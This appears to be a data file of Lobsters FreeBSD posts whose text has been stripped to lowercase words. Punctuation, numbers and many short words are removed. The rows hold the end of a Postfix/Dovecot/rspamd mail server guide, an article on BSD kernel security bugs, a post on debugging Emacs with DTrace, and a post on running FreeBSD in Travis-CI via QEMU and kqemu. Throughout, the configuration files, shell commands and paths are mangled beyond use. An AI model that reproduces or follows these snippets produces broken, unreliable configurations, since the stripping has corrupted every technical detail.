waste disk space storing attachment twice pretty neat pw useradd u n vmail c virtual mail handler varmailvhosts usrsbinnologin mkdir varmail vhosts attachment chown vmail vmail varmail vhosts attachment chmod varmail vhosts attachment navigate dovecot configuration directory cd usrlocaletcdovecot find readme exampleconfig directory feel free read dive configs first create additional directory mkdir usrlocaletcdovecot confd sieve sievebefored sieveafterd chown root dovecot usrlocaletcdovecot sieve sievebefored sieveafterd open dovecotconf first set generic option include rest config file usrlocaletcdovecotdovecotconf protocol imap lmtp firstvaliduid lastvaliduid include confd conf includetry localconf remaining config file live confd directory file configuration reproduced entirety helpful comment appropriate authcachesize authcachettl hour authcachenegativettl hour authmechanisms plain passdb driver ldap args usrlocaletcdovecotldapconfext userdb driver static args uidvmail gidvmail homevarmailvhosts n file specified passdb provides ldap query information necessary authenticate usernames password note setup authenticate user part mail provider like use entire email address case usrlocaletcdovecotldapconfexthosts localhost authbind ldapversion base ouusers dcexample dccom deref never scope subtree userattrs userfilter objectclassinetorgperson uid n passattrs mailuser userpasswordpassword passfilter objectclassinetorgperson uid n defaultpassscheme crypt mailhome varmailvhosts n maillocation mdbox mdbox namespace inbox separator inbox yes mailprivilegedgroup vmail mailattachmentdir varmailattachments mailattachmentminsize mailfsync never service imaplogin inetlistener imap address servicecount processminavail vszlimit service inetlistener port inetlistener port service imap servicecount processminavail service lmtp unixlistener varspoolpostfixprivatedovecotlmtp group postfix mode user postfix service auth unixlistener varspoolpostfixprivateauth mode user postfix group postfix service authworker user vmail ssl required sslcert usrlocaletcsslcertsmailexamplecomecccrt sslkey usrlocaletcsslcertsmailexamplecomecckey ssldhparameterslength sslprotocols sslcipherlist sslpreferserverciphers yes protocol lda mailfsync optimized mailplugins mailplugins sieve namespace inbox mailbox draft auto subscribe specialuse draft mailbox junk auto create specialuse junk mailbox trash auto create specialuse trash mailbox archive auto subscribe specialuse archive mailbox sent auto subscribe specialuse sent imapidlenotifyinterval min protocol imap mailmaxuseripconnections mailplugins mailplugins imapsieve lmtp mailfsync optimized mailplugins mailplugins sieve protocol sieve sieve file sieve activedovecotsieve sievebefore usrlocaletcdovecotsievebefored sieveafter usrlocaletcdovecotsieveafterd recipientdelimiter sievequotamaxstorage fully functional imap server enable dovecot start boot etcrcconfdovecotenable yes start dovecot service dovecot start make sure check varlogmaillog error congratulation fully functional mail server make sure tcp traffic port enabled firewall remaining search spam filtering extra good time stop make sure everything work go testing mail server first get separate terminal open tail mail log testing everything tail f varlogmaillog start checking mx record dns using dig command dns configured correctly see result like following dig examplecom mx short dig mailexamplecom short test ability send receive mail nt worry ca nt connect server port residential isps block traffic port deter spammer local machine use email client connect mail server connectivity detail following incoming mail imap username ldap username password ldap password server mailexamplecom port ssl yes outgoing mail smtp username ldap username password ldap password email address username examplecom server mailexamplecom port ssl starttls log see empty mailbox default folder inbox draft junk etc need check mail log troubleshoot dovecot next need test outgoing mail hopefully spare gmail account another working email address test send email mail client see something like mail log postfixsmtpd connect someipaddress postfixsmtpd clientsomeipaddress saslmethodplain saslusernameuser examplecom postfixcleanup messageid examplecom postfixqmgr user examplecom queue active postfixsmtp yourotheremail gmailcom relaygmailsmtpinlgooglecom statussent ok gsmtp postfixqmgr removed postfixsmtpd disconnect someipaddress nt see error log find email sent email account inbox sure check spam folder got flagged spam testing step dkim section help determine test incoming mail email account reply message sent first email ever sent new personal email server finger crossed side successfully find mail server delivers message see something like mail log postfixsmtpd connect postfixverify cache btree vardbpostfixverifycache full cleanup entry postfixsmtpd postfixcleanup messageid mailgmailcom postfixqmgr yourotheremail gmailcom queue active dovecot lmtp connect local dovecot lmtp user examplecom sieve msgid mailgmailcom stored mail mailbox inbox postfixlmtp user examplecom relaymailexamplecom privatedovecotlmtp statussent user examplecom saved dovecot lmtp disconnect local successful quit postfixqmgr removed postfixsmtpd disconnect postfixsmtpd connect unknown postfixsmtpd disconnect unknown error see first message new imap inbox failure logged investigate postfix likely problem finding virtual mailbox postfix issue handing mail dovecot nt receive email nt see anything logged probably firewall issue problem mx record dns also make sure hosting provider allows traffic port paranoid able send receive email new mail server ready get rest goody like fulltext searching spam filtering read solr fulltext search solr standalone fulltext search platform apache apache foundation heavyweight based java currently best bet want open source fulltext search dovecot easily installed port freebsd cd usrportstextprocapachesolr make install clean pull java dependency may want grab coffee something jvm compiles default usrlocaletcsolrinsh fine enable solr start boot etcrcconfsolrenable yes finally start solr server service solr start need create collection dovecot use su solr c usrlocalsolrbinsolr create c dovecot n dovecot create solr collection dovecot vardbsolrdovecot navigate configuration need include magic incantation found guy blog get solr working dovecot cd vardbsolrdovecotconf delete managedschema file rm vardbsolrdovecotconfmanagedschema create file called schemaxml content curl vardbsolrdovecotconfschemaxml http replace entire content solrconfigxml version curl vardbsolrdovecotconfsolrconfigxml http finally make sure solr user still owns file chown solr solr vardbsolrdovecotconf schema solrconfig xml solr ready index email dovecot restart server change take effect service solr restart need configure dovecot use solr server uncomment line file previous section mailplugins ft ftssolr ftsautoindex yes ft solr ftssolr urlhttp reload dovecot change take effect service dovecot reload whenever receive email move message one imap folder another see something like mail log dovecot indexerworker user examplecom indexed message inbox indexing occurs new message arrives folder index entire inbox mail user run following command doveadm index inbox finally according dovecot documentation solr database need issued commit optimize command every often easily accomplished adding following cron job make sure get path curl correct using linux solr usrlocalbincurl http optimizetrue devnull solr usrlocalbincurl http committrue devnull fulltext search mailbox imap test searching text mobile imap client often desktop mail client perform search using local cached data test server using telnet type following line including preceding number prompt telnet localhost imap ok capability literal saslir ready login yourusername yourpassword select inbox search text test encounter issue solr provides web interface localhost port set ssh tunnel server forward port local machine check status also view log varlogsolr rspamd spam filtering rspamd fast open source spam filtering system utilizes multiple technique prevent spam reaching mailbox happy user dspam year offically abandoned since rspamd actively developed appears much modern project written c quite fast integrates directly postfix milter like dspam us bayesian filtering learn user consider spam ham however also incorporates many antispam measure rbl check spfdkimdmarc validation dcc bulk mail check greylisting name addition useful feature like dkim signing outgoing mail automatic whitelisting reply someone web interface see spam checking result real time sold yet let get rspamd installed available freebsd port cd usrportsmailrspamd make install clean use following build option gd hyperscan hyperscan option especially enables high performance regex matching enable rspamd start boot etcrcconfrspamdenable yes finally start rspamd service rspamd start many rspamd module require redis instance work install well default build option fine cd usrportsdatabasesredis make install clean want set redis option recommended official rspamd tutorial usrlocaletcredisconf bind maxmemory maxmemorypolicy volatilelru enable redis start boot etcrcconfredisenable yes finally start redis daemon service redis start one rspamd module use depends dcc daemon check mail bulkiness install port well default build option fine cd usrportsmaildccdccd make install clean uncomment following option usrlocaldccdccconf using dcc service detect spam wo nt actively reporting anything usrlocaldccdccconfdccmlogatnever dccmrejectatmany dccifdenableon dcc rather arcane nt seem log syslog like modern software nt figured nice way rotating log newsyslogd yet cronjob delete every day usrbinfind usrlocaldcclog newermt day ago delete enable dcc start boot etcrcconfdccifdenable yes finally start dcc daemon service dccifd start ready configure rspamd rspamd default configuration file live usrlocaletcrspamd nt edit file directly overwritten rspamd package updated instead create local configuration directory custom configuration go mkdir usrlocaletcrspamdlocald rspamd website find rspamd quick start guide along documentation module feel free design setup copy done file enabled useful module provided commentary appropriate usrlocaletcrspamdlocaldworkercontrollerinc password bindsocket varrunrspamdrspamdsock ownernobody bindsocket usrlocaletcrspamdlocaldworkernormalinc enabled false usrlocaletcrspamdlocaldworkerproxyinc milter yes bindsocket varrunrspamdmiltersock ownernobody timeout upstream local default yes selfscan yes usrlocaletcrspamdlocaldredisconf server usrlocaletcrspamdlocaldclassifierbayesconfautolearn true backend redis usrlocaletcrspamdlocalddccconf host usrlocaldccdccifd timeout usrlocaletcrspamdlocalddkimsigningconf path vardbrspamddkim domain selectorkey selector dkim usrlocaletcrspamdlocaldmxcheckconf enabled true usrlocaletcrspamdlocaldphishingconf openphishenabled true phishtankenabled true usrlocaletcrspamdlocaldrepliesconf action action usrlocaletcrspamdlocaldsurblconf redirectorhostsmap usrlocaletcrspamdredirectorsinc usrlocaletcrspamdlocaldurlreputationconf enabled true usrlocaletcrspamdlocaldurltagsconf enabled true restart rspamd change take effect service rspamd restart need configure postfix use rspamd milter open usrlocaletcpostfixmaincf uncomment line added postfix section usrlocaletcpostfixmaincfmilterprotocol milterdefaultaction accept smtpdmilters unix varrunrspamdmiltersock miltermailmacros mailaddr clientaddr clientname authauthen reload postfix change take effect service postfix reload point rspamd filtering incoming email arrives postfix verify send test email check output mail log along varlogrspamdrspamdlog also view realtime filtering stats rspamd web interface set ssh tunnel server forward port localhost point web browser verified rspamd postfix working together left configure dovecot train rspamd move message junk folder step achieving derived dovecot guide add new file dovecot confd directory following content sieveplugins sieveimapsieve sieveextprograms junk copy file usrlocaletcdovecotsievereportspamsieve junk copy file usrlocaletcdovecotsievereporthamsieve sievepipebindir usrlocaletcdovecotsieve sieveglobalextensions vnddovecotpipe restart dovecot load necessary sieve plugins service dovecot restart create following sieve script usrlocaletcdovecotsieve directory usrlocaletcdovecotsievereportspamsieverequire vnddovecotpipe copy imapsieve environment variable environment match imapemail set email pipe copy trainspamsh email usrlocaletcdovecotsievereporthamsieverequire vnddovecotpipe copy imapsieve environment variable environment match imapmailbox set mailbox string mailbox trash stop environment match imapemail set email pipe copy trainhamsh email sieve script triggered whenever email get moved junk folder need manually compile since dovecot nt write permission directory cd usrlocaletcdovecotsieve sievec reportspamsieve sievec reporthamsieve need create shell script sieve script execute create trainspamsh trainhamsh directory usrlocaletcdovecotsievetrainspamshexec usrlocalbinrspamc h varrunrspamdrspamdsock learnspam usrlocaletcdovecotsievetrainhamshexec usrlocalbinrspamc h varrunrspamdrspamdsock learnham make sure executable chmod x usrlocaletcdovecotsievetrain spam ham sh finally need tell dovecot automatically move email rspamd tagged spam junk folder using global filter xspam header fileinto header xspam yes fileinto junk need precompile script cd usrlocaletcdovecotsievebefored sievec reload dovecot change take effect service dovecot reload dovecot inform rspamd daemon retrain message spam ham move junk folder test move message junk mail client check mail rspamd log message varlogrspamdrspamdlog whenever message retrained dkim validation outgoing mail dkim domainkeys identified mail standard mail server cryptographically verify email claiming originate given domain indeed originate server within domain control general idea sender mail server sign outgoing message private key recipient mail server retrieves public key txt record hosted sender dns zone verify authenticity message using dkim recipient certain message really come sender authorized mail server nt tampered transit luckily rspamd provides builtin support dkim signing using postfix milter already configured previous section mean additional software configure need generate private key create dkim record containing public key dns recall following file created rspamd section usrlocaletcrspamdlocalddkimsigningconfpath vardbrspamddkim domain selectorkey selector dkim domain variable expect outgoing email examplecom email address signed using corresponding examplecom private key file selector variable bear explanation dkim specification allows use multiple key single domain distinguish using selector value dkim header message case keep simple use single selector called dkim everything generate dkim keypair using rspamadm command rspamadm dkimkeygen k vardbrspamddkimexamplecomdkimkey b dkim examplecom save private key file examplecom rspamd dkim directory print dns record dkim public key standard output see something like dkimdomainkey txt krsa running dns server paste directly zone file using dns provider web interface small caveat public key large fit single dns record zone file parenthetical syntax cause dns server split key separate record add provder web interface need create txt record dkimdomainkeyexamplecom generate value contatenating three line together removing quote point spf dkim properly configured however nt informed mail server either safeguard fail dmarc come dmarc us special dns record declare mail server treat mail domain validation fail create txt record dmarcexamplecom like following usrlocaletcnamedmasterexamplecomdbdmarc txt preject adkimr aspfr spreject preject field indicates email domain pas spf dkim check assumed spam rejected adkimr aspfr field indicate using relaxed validation default finally spreject field indicates policy apply subdomains examplecom testing dkim dmarc spf public key dmarc record dns ready test dkim signing check whether record propagated using dig dig short txt dkimdomainkeyexamplecom dig short txt dmarcexamplecom lot online tool use test whether dkim signing working domain favorite dkimvalidatorcom site provides randomized email address simply send test email mail server provided email address wait second hit view result presented report describing whether dkim spf validation passed domain also test dkim dmarc spf sending test email gmail account gmail inbox click arrow next reply button choose show original presented table containing passfail result spf dkim dmarc validation fail check message header clue well rspamd mail log error passed mail server professionally configured half mail get real company sieve scripting mailbox best thing running mail server able script inbox instead creating filter using kludgy synax web interface literally write program determine sort mail sieve regular expression ifelse control structure full message metadata including header disposal recall dovecot section sieve script live virtual home directory imap user dovecot sieve functionality allows user multiple sieve script stored server one active given time configuration active sieve script user alphonsus would located varmailvhostsexamplecomalphonsusdovecotsieve dovecotsieve file symlink script sieve directory root awesomebox varmailvhostsexamplecomalphonsus l l total lrwxrxrx vmail vmail mar dovecotsieve sievemycoolscriptsieve rwrwr vmail vmail mar dovecotsvbin drwx vmail vmail aug mdbox drwxrwxrx vmail vmail mar sieve use mail client managesieve support like kmail detail handled automatically also use sieveconnect commandline managesieve client rarely modify sieve script need make change ssh server edit vim let make basic sieve script open root shell navigate imap user virtual home directory varmailvhosts cd varmailvhostsexamplecomuser create sieve directory nt already exist mkdir sieve create sieve script name file whatever like vim sievemyawesomescriptsieve ready write script check example sieve script dovecot wiki keep simple varmailvhostsexamplecomusersievemyawesomescriptsieverequire regex fileinto allof address root awesomeboxexamplecom header contains subject run output fileinto log stop anyof address autoconfirm amazoncom address domain earthfarecom fileinto shopping stop nt believe sieve script create new imap folder sure create folder need mail client first need create symlink dovecot know active script ln sievemyawesomescriptsieve dovecotsieve make sure script actually compiles sievec dovecotsieve finally make sure everything still owned vmail user chown r vmail vmail dovecotsieve dovecotsvbin sieve check mail log next time receive email verify dovecot nt trouble executing script get convoluted want seen cool setup people call external shell script certain email receieved conclusion made far pretty decent personal email server hosting family email vps setup year great result yet spammer make past rspamd sync search work great idevices also despite warning various online naysayer never issue others receieving mail tech recruiter better worse seem trouble reaching inbox one thing nt cover guide webmail never felt need one mutt mailapp io mail client served quite well honestly hate dealing additional attack vector phprubyofftherails web application however something need heard good thing roundcube also ca nt stress enough back mail directory regularly doubt lot work get mail server running get working setandforget keep system updated rotate ssl certificate expire use good devops practice serve well long keep paying hosting provider sure many argue much work little gain nsa probably crack encryption mail go gmail anyway ton email still plain text etc however reason selfhosting thing philosophical technical net neutrality debate moot online communication controlled handful monolothic advertising company internet greatest strength always free exchange idea information let make sure stay way
415,Lobsters,freebsd,FreeBSD,Are the BSDs dying? Some security researchers think so,https://www.csoonline.com/article/3250653/open-source-tools/is-the-bsd-os-dying-some-security-researchers-think-so.html,bsds dying security researcher think,told audience openbsd clear winner security netbsd clear loser term code quality freebsd technically advanced bsds among others freebsd kernel vulnerability affect o x bsds dying,open source berkeley software distribution bsd version unix suffer lack eyeball code hurt security ilja van sprundel director penetration testing ioactive told audience leipzig germany end decemberstruck small number reported bsd kernel vulnerability compared linux van sprundel sat last summer reviewed bsd source code spare time come handful bsd security kernel bug advisory released every year wanted know bsds much secure one looking van sprundel say easily found around kernel bug across three bsds including freebsd openbsd netbsd many bug called lowhanging fruit promptly reported bug six month later time talk many remained unpatched large security flaw linux kernel nt long lifetime get found pretty fast van sprundel say bsd side nt always true found bunch bug around long time many present code decade moreopenbsd clear winner securityopenbsd focus security last two decade show code van sprundel told audience openbsd far knowledgeable developer come security one thing openbsd much smaller code base around million line code compared freebsd roughly million netbsd million obviously play part van sprundel say ca nt bug code nt smaller code base partly accident suggested lack developer resource prevented openbsd implementing feature want also smaller purpose deliberate decision reduce attack surface including removing support rare uncommon older device architecturesin term code quality van sprundel also praised openbsd code noting lowhanging fruit like integer overflow good gone place consistent quality observed openbsd however openbsd relative lack popularity hurt operating system security suggested bug still easy find people looking openbsd would bug reported theo de raadt founder openbsd agreed van sprundel eyeball openbsd would make operating system secure remember reading first slide mostly impact small api misuse de raadt tell cso online email unfortunately problem volume code relative manpower ensuring code percent bugfree handle exceptional condition rather difficult problem van sprundel also praised openbsd response bug finding saying de raadt responded within week openbsd patched flaw within day communicated ilja start got team working discovery de raadt writes solved within week made patch available one important experience way proactive responsive volunteerdriven software project never allow deferral issue later problem must handled asap keep interest netbsd clear loser term code qualitynetbsd focus many year support widest range hardware possible objective however come need include large quantity legacy binary compatibility compat code varying degree quality van sprundel pointed result netbsd seems le consistent security code quality netbsd response van sprundel bug report strikingly good bad one hand say fixed virtually bug submitted pretty much overnight hand patch yet shipped user six month later unless run build recently checkedout code netbsd machine still vulnerable netbsd developer corrected van sprundel account noting netbsd shipped december week talk contains patch security issue found lot finding binary compatibility layer nt thing going cause remote vulnerability anyway taylor r campbell member netbsd foundation board director say someone would need access system anyway run code large number bug van sprundel found netbsd project sluggish response raise red flag future netbsd netbsd practically dead patroklos argyroudis security researcher census security work whose work bsd security van sprundel cited talk say past company trying support commercially think long gone although netbsd volunteerdriven open source project without fulltime developer campbell david maxwell former member netbsd foundation board confident agryroudis pessimism unfounded primary goal core system clean architecture becomes really easy port new platform maxwell say probably continue strong place historically also notoriously bad marketing campbell addsfreebsd technically advanced bsdslong heralded performance network stack freebsd far popular three big bsds find home netflix whatsapp among others modern perf test freebsd par linux surpassing little van sprundel say place could deploy linux safe say could probably deploy freebsd massively deployed lot place freebsd responded kernel bug week fixed source code repository however software project released handful advisory status rest unknown moment according van sprundelthe freebsd project pushed back van sprundel finding however one issue large variety issue found issue practical exploit ed maste director project development freebsd foundation member elected freebsd core team say started treating bug security issue lack developer hurt freebsd security ability respond bug report also implement new industrystandard security feature argyroudis suggests popular bsd technically advanced freebsd nt many developer linux basically mean bit behind term security feature recently freebsd implemented preliminary support aslr userland argyroudis say yet support kaslr also question whether freebsd network stack still killer feature maybe ten year back notion freebsd better performance wise network stack much better thing argyroudis say sure case anymore would definitely skeptical maste disagrees able phenomenal amount work much smaller developer base phenomenal term quantity quality work compared linux say suggestion future somehow hampered lack developer absolutely untrue freebsd kernel vulnerability affect o x lot freebsd code mac o x freebsd security team coordinate disclosure apple van sprundel say remains unclear however badly reported vulnerability affect apple laptop darwin kernel diverged sharply freebsd year ago o x received great deal scrutiny security researcher year submitted bug freebsd guy asked mind send guy apple van sprundel say security team apple list bug idea much applies probably couple bug apply apple respond request comment maste declined speculate pointing apple would know answer question netbsd maxwell quick point o x includes code freebsd also netbsd openbsdare bsds dying popularity affect security turn eyeball code mean shorter bug lifetime developer mean new security feature reach user faster bsds lost battle mindshare linux may well bode ill future sustainability bsds viable secure operating system say people reviewing linux kernel code simply order magnitude van sprundel concludes based result code quality alone ca nt account discrepancy bug number bsd v linux openbsd may likely survive despite far le popular freebsd moment argyroudis suggests see greater chance openbsd survive focused use case target specific thing freebsd think much difficult survive openbsd measuring popularity bsds difficult however maste argues one challenge trying measure quantify popularity freebsd bsds lot case used application deployment particularly visible say appliance product build derivative freebsdthe permissive bsd license make even harder quantify popularity bsds end user thing like license code may matter much netbsd maxwell say people build embedded system people building product licensing code important argyroudis remains pessimistic future bsds love bsd code base say would love able tell different thing like much popular freebsd easy going survive linux unfortunately nt think case think boil lack developer
416,Lobsters,freebsd,FreeBSD,Debugging Emacs or: How I Learned to Stop Worrying and Love DTrace,http://nullprogram.com/blog/2018/01/17/,debugging emacs learned stop worrying love dtrace,bsd elfeed seeing error responsibility downloading feed data hunt zebra bryan cantrill dtrace freebsd bryan cantrill dtrace bsd interview writing talk scattered around dtrace blog illumos cddl infamously include zfs dtrace released slew partial option strace broken version omnios enchive keep software tiny community pkgsrc openindiana freebsd dtrace dtrace really freebsd raspberry pi freebsd support raspberry pi mostly program vim day process sentinel curl linebuffered problem ran four year ago writing emacsql oneliner old boilermaker story dtrace quickly helped identify place hit emacs hammer,january update article featured bsd starting time elfeed experiencing strange spurious failure every often user seeing error spoiler warning updating feed error process sentinel search failed use elfeed might even seen surface appeared curl tasked responsibility downloading feed data producing incomplete output despite reporting successful run since run successful elfeed assumed certain data curl output buffer since failed hard unfortunately issue reproducible manually running curl outside emacs never revealed issue asking elfeed retry fetching feed would work fine issue would randomly rear head elfeed fetching many feed parallel stress time error discovered curl process exited vital debugging information lost considering likely bug emacs really reliable way capture necessary debugging information within emacs lisp indeed later proved case quickanddirty work around use conditioncase catch swallow error bizarre issue show rather fail badly front user elfeed could attempt swallow error assuming reliably detected treat fetch simply failure sit comfortably elfeed done due diligence checking error already someone lying elfeed intended catch pant fire someday need witness bug one machine elfeed part daily routine surely experience issue someday plan day come run modified elfeed instrumented capture extra data would also routinely run emacs gdb could inspect failure deeply wait hunt zebra bryan cantrill dtrace freebsd holiday rediscovered bryan cantrill system software engineer worked sun well known dtrace first exposure bsd interview rewatched interview decided lot learn become personal hero scoured internet writing talk besides already linked article couple great presentation also find writing scattered around dtrace blog interesting operating system technology came sun final year notably dtrace zfs bryan speaks passionately almost matter luck survived oracle acquisition thanks sun releasing open source nick time otherwise would lost forever scattered exsun employee still passionate prior work sun along old customer since picked piece kept going community name illumos like open source flotilla naturally wanted get hand stuff try really good say normally stick linux generally sun technology main reason license incompatibility sun released code cddl incompatible gpl ubuntu infamously include zfs distribution unwilling take risk porting dtrace serious undertaking since got finger throughout kernel also make licensing issue even complicated update feburary dtrace released allowing legally integrated linux linux reputation invented nih syndrome licensing issue certainly contribute rather adopt zfs dtrace reinvented scratch btrfs instead zfs slew partial option instead dtrace normally interested system call tracing go strace though certainly limitation including situation debugging curl emacs another famous example nih linux epoll broken version bsd kqueue want try need install different operating system dabbled omnios o built illumos virtual machine using alien environment test software eg enchive omnios philosophy called keep software kysty really code packaging honestly blame since tiny community best solution probably pkgsrc essentially universal packaging system otherwise also openindiana friendly desktoporiented illumos distribution still short much thing work situation like running linux couple decade ago still difficult interested trying dtrace easiest option day probably freebsd got big active community thorough documentation huge selection package license bsd license duh compatible cddl zfs dtrace ported freebsd dtrace done talking yet described dtrace really pretend write tutorial provide enough information follow along dtrace tracing framework debugging production system real time kernel application production system part mean stable safe using dtrace put system risk crashing damaging data real time part mean little impact performance use dtrace live active system little impact core design principle vital troubleshooting really tricky bug show production dtrace probe scattered throughout system system call scheduler event networking event process event signal virtual memory event etc using specialized language called unrelated general purpose programming language dynamically add behavior instrumentation point generally behavior capture information also manipulate event traced probe fully identified delimited colon provider module function probe name empty element denotes sort wildcard example syscall open entry probe beginning ie entry open syscall entry match system call entry probe unlike strace linux monitor specific process dtrace applies entire system active run curl strace emacs modify emacs behavior dtrace instrument every curl process without making single change emacs negligible impact emacs big deal come elfeed issue freebsd much better poised debugging problem catch act however month since bug report really making connection yet hoping eventually find interesting problem apply dtrace freebsd raspberry pi settled freebsd playground technology decide could always run virtual machine always interesting try thing real hardware freebsd support raspberry pi tier system raspberry pi sitting around collecting dust put use wrote image sd card day stretched leg new system cloned couple dozen git repository ran build test got feel thing tried port system first time mainly discover lowpowered raspberry pi take day build package want try mostly program vim day day even set emacs eventually build emacs clone configuration fire give elfeed spin search failed bug strike dozen time perfect lowpowered platform jackpot particular bug triggering left right given got dtrace disposal perfect place debug something lying elfeed dtrace play judge dive see three possibility curl reporting success truncating output emacs quietly truncating curl output emacs misinterpreting curl exit status dtrace observe every curl process writes emacs also double check curl exit status come following newbie dtrace script syscall write entry execname curl printf write n pid stringof copyin syscall exit entry execname curl printf exit dn pid execname curl predicate obviously cause behavior fire curl process first probe dtrace print line every write curl correspond argument write fd buf count log process id pid write length write actual content written remember curl process run parallel emacs pid allows associate separate writes exit status second probe print pid exit status first argument exit also want compare exactly delivered elfeed curl exit modify process sentinel callback handle subprocess exiting call writefile action taken compare buffer dump log produced dtrace two important finding first search failed bug occurs buffer completely empty time truncated end http header time right blank line dtrace indicates curl job full emacs liar delivering curl data elfeed pretty annoying second curl linebuffered line separate independent write certainly expecting normally c library line buffering output terminal guessing user may watching expecting output arrive line time sample looked like log write server ubuntu write location http blogplovercomindexatom write contentlength write contenttype texthtml write would curl think emacs terminal oh right problem ran four year ago writing emacsql default emacs connects subprocesses pseudoterminal pty called mistake emacs back still stand claim pty cause weird annoying problem little benefit interpreting control character hope transferring binary data subprocesses generally get line buffered make slower though situation might desirable stdout stderr get mixed together optional since emacs new bug somewhere emacs cause truncation ptys used heavily parallel eyeballing dtrace log knew dump pty switch pipe controlled processconnectiontype variable fixing oneliner completely resolve truncation issue elfeed noticeably faster fetching feed machine longer receiving mountain xml one line time like sucking pudding straw quite zippy even raspberry pi never case without search failed bug even never affected bug benefit fix officially reported emacs bug yet reproducibility still issue need something better fire bunch http request across internet parallel raspberry pi fix reminds old boilermaker story charging lot money swing hammer problem arose dtrace quickly helped identify place hit emacs hammer finally big thanks alphapapa originally taking time report bug month ago
417,Lobsters,freebsd,FreeBSD,Running FreeBSD in Travis-CI,http://erouault.blogspot.com/2016/09/running-freebsd-in-travis-ci.html,running freebsd travisci,question qemu sshpass job killed kvm let fabrice bellard linux kernel browser kqemu documentation virtualbox regarding software virtualization patch patch succesful build build recipee,note geospatial focused reader article little geo although applied gdal software virtualization hack software archeology value free software note virtualization expert one please bear approximate language inaccuracy travisci popular continuous integration platform easily used software project hosted github travisci free offer software public repository github travisci provides cloud instance running linux mac o x increase portability test gdal wondered somehow possible run another operating system travisci example freebsd search lead question bug tracker outcome seems possible medium long term plan one idea came quickly mind use qemu machine emulator simulate full machine cpu peripheral memory etc several hardware architecture intel arm mips sparc powerpc etc run qemu mostly need virtual hard drive ie file replicates content hard disk virtual machine want run found small readytouse image freebsd one nice property ssh server dhcp automatically started making possible remote connect starting travisci ubuntu trusty image step launch freebsd guest sudo aptget install qemu wget ftp tar xjvf daemonize display none smp net user hostfwdtcp net nic qemu invokation start virtual machine daemon without display turn networking asks guest ie freebsd tcp port ssh port accessible host linux trusty port ssh vm one slight inconvenience ssh login requires password root password vm password ssh secured nt accept password provided file piped echo found sshpass utility designed overcome situation security nt really matter however version sshpass bundled ubuntu trusty nt work corresponding ssh version surprisingly since author sshpass mention full assumption ssh work easily break change ssh found latest version worked however extra line login freebsd instance wget http tar xzf cd configure make cd export myssh p password ssh userknownhostsfiledevnull stricthostkeycheckingno root localhost configure bit freebsd vm install pkg package manager dependency build gdal myssh env assumealwaysyesyes pkg bootstrap myssh mkdir etcpkg p password scp userknownhostsfiledevnull stricthostkeycheckingno p freebsdconf root localhost etcpkgfreebsdconf myssh env assumealwaysyesyes pkg update myssh env assumealwaysyesyes pkg install gmake myssh env assumealwaysyesyes pkg install myssh env assumealwaysyesyes pkg install myssh env assumealwaysyesyes pkg install curl myssh env assumealwaysyesyes pkg install expat go configure make work minute later maximum length travisci job job killed perhaps gdal code base compiled reason used pure software emulation mode qemu involves onthefly disassembling code run reassembling qemu example emulate arm guest intel host viceversa really shortcut guest host architecture guest typically run time slower would real machine native architecture actually true since addition cpu instruction dedicated virtualization vtx intel amdv amd hypervisor called kvm kernel virtual machine added linux kernel qemu use kvm implement mentioned shortcut reach near baremetal performance take use kvm instead let sigh attempt fails miserably failed initialize kvm error message display content proccpuinfo get flag fpu vme de pse tsc msr pae mce apic sep mtrr pge mca cmov pat clflush mmx fxsr sse s ht syscall nx rdtscp lm constanttsc repgood nopl xtopology nonstoptsc eagerfpu pni pclmulqdq fma movbe popcnt aes xsave avx rdrand hypervisor lahflm abm fsgsbase smep erms xsaveopt come time good old memory bit software archeology qemu started fabrice bellard nt know name yet f bellard created ffmpeg qemu hold world record number decimal pi computed cot pc ported qemu javascript run linux kernel browser devised bpg new compression based hevc etc time interest focused qemu created kqemu kernel module linux window freebsd host could significantly enhance qemu performance guest host kqemu requires qemu modified communicate kernel module similarly working qemu kvm kernel module kqemu started closed source project eventually released gpl one key feature kqemu require use hardware virtualization instruction kqemu software virtualization involves complicated trick particularly code guest run ring ie highest priviledges must patch run ring nonpriviledge code host get idea involved reading documentation virtualbox regarding software virtualization pretend qemukqemu exact trick virtualbox give least picture challenge involved complexity lead kqemu eventually abandonned cpu hardware virtualization became widespread market since kvm based virtualization much cleaner implement starting qemu kqemu support finally dropped qemu code base due kqemu using hardware virtualization instruction good hope run inside virtualized environment let try qemu kqemu compiling qemu ubuntu trusty run quite well except linking error easily fixed trivial patch building kqemu bit involved kernel module internal linux kernel api prone change time time one good news linux specific part kqemu relatively small file api break limited aspect way get memory management structure current task changed linux found simple patch solve another change occured later linux release removal kernel semaphore replaced mutexes cumulated patch fix compilation issue nt pretend technically correct knowledge kernel internals limited local test seemed confirm adding enablekqemu qemu command line worked sufficiently well start thing freebsd vm decent speed tried kernelqemu switch turn kqemu acceleration kernel guest code resulted crash qemu near end boot process freebsd surprising kernelqemu make assumption internal working guest o perhaps freebsd meet perhaps bug qemukqemu running travisci successful compilation done minute probably half speed bare metal good enough kqemu support smp guest listed potential roadmap probably achievable wanted speed compilation could potentially launch kqemuenabled qemu instance travisci vm core available would compile different part software build tree hosted nfs share said compilation go fine except build process actually qemu instance crash libgdalso building time also reproduce locally probably history qemu kqemu nt long enough go beta quality production quality workarounded issue compilation enablekqemu mode restarting vm pure software emulation linking restarting enablekqemu mode unfortunately running gdal python autotest suite kqemu mode also lead qemu crash due design kqemu runnnig code ring crash affect host running completely pure emulation mode reach minute timeout sake demonstration run one test file first succesful build given build recipee could also potentially tried virtualbox mentionned support software virtualization acceleration bit guest nt find readymade freebsd image directly ssh bit guest virtualbox require hardware virtualization available host best knowledge kqemu solution enable acceleration bit guest without hardware requirement main conclusion experiment striking example key advantage open source model kqemu released gpl would never able resurrect modify run newer kernel actually also attempt developing alternative kqemu kqemu still closed source abandonned virtualbox open sourced
419,Lobsters,freebsd,FreeBSD,34C3 - May contain DTraces of FreeBSD,https://www.youtube.com/watch?v=x1wmzxRXOEo,may contain dtraces freebsd,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature may contain dtraces freebsd youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature may contain dtraces freebsd youtube
